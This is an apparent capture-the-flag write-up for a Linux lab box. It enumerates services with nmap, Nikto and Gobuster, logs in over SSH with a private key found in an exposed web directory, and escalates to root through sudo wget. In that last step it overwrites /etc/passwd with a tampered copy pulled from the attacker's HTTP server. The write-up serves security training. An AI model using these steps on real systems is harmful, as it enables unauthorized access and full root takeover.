#Linux #Wget

**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.10.207.235
  ```

- To see the versions of the services running (**-sV**)
- To perform a script scan using the default set of scripts (**-sC**)
- To scan all ports from 1 through 65535 (**-p-**)

OPEN PORTS

* 22/tcp ssh
* 80/tcp http

![image](https://user-images.githubusercontent.com/99097743/171080626-c28a88e2-45bf-4be1-a7f1-6d927ee7b2b8.png)


Interesting info: A person named Jessie is mentioned in the website source code:

![image](https://user-images.githubusercontent.com/99097743/171075119-d4d404da-8220-4061-ad97-5bd0af1dd0eb.png)

Let's try **Nikto** for vulnerability scanning. 

Nikto is an open source web server and web application scanner. Nikto can perform comprehensive tests against web servers for multiple security threats, including over 6700 potentially dangerous files/programs. Nikto can also perform checks for outdated web servers software, and version-specific problems. Here are some of the commonly used commands:

![image](https://user-images.githubusercontent.com/99097743/171077871-a03baaac-6541-4648-b22a-aa9856cbcfa1.png)

Nikto results reveal that the Apache server is outdated -v 2.4.18 

![image](https://user-images.githubusercontent.com/99097743/171078750-8a26be16-d1db-492d-bf75-f2c04eb39023.png)

A **searchsploit** analysis confirms an existing vulnerability on the Apache server. 

![image](https://user-images.githubusercontent.com/99097743/171079027-f7f5dd4c-4afe-4b23-a06c-72b79222cb65.png)

Details of the CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation are summarized in the following link:

https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html

**Gobuster** search suggests a hidden directory **/sitemap** (Status 301)

![image](https://user-images.githubusercontent.com/99097743/171080870-11321b68-cb53-4930-8421-0a595b952689.png)

A further **Gobuster** search on `http://10.10.207.235/sitemap` suggests a hidden **/.ssh** directory hosting a private key! 

![image](https://user-images.githubusercontent.com/99097743/171082095-e325cb85-02a7-4028-a57d-dc2dbafa9d4d.png)

What we need to do now are:

1) Change file permissions for the id_rsa as `chmod 600 jessie_id_rsa`
2) Login ssh using the private key: `ssh -i path/to/key_file username@remote_host`

We can assume that the private keys belongs to Jessie -- This name was mentioned in a comment line in website source code (see abobe)

![image](https://user-images.githubusercontent.com/99097743/171085363-81619d9f-110a-4f47-b960-14ecb9ad9df5.png)

We now have the user flag captured, let's explore the vulnerabilities for privilege escalation, let's try `sudo -l` to see the allowed commands

![image](https://user-images.githubusercontent.com/99097743/171085848-4e010d8f-f21b-457f-be9c-ed7303f629d3.png)

It seems that we can use GTFOBins Wget vulnerability as explained here: https://gtfobins.github.io/gtfobins/wget/

![image](https://user-images.githubusercontent.com/99097743/171088818-d8ec1a56-82cc-4aaf-a0c9-ee43117274e3.png)

Here are steps that can be followed:

1) Copy `etc/passwd` in the local host, generate a password for the root account, and include it as password hash in passwd:

![image](https://user-images.githubusercontent.com/99097743/171087622-38672abd-b16e-44e2-a833-1db586e0030a.png)

![image](https://user-images.githubusercontent.com/99097743/171089509-76761a52-80ba-430a-b7df-d7d6b6e8d64a.png)


2) Open an HTTP server on the local host: `sudo python3 -m http.server 80`

3) Transfer the passwd to target machine: `sudo wget http://10.18.123.93/passwd -O /etc/passwd`

![image](https://user-images.githubusercontent.com/99097743/171089684-54d7a62a-9d2a-42b3-b205-8b1655981162.png)

4) Elevate to root: `su root` -- Password above

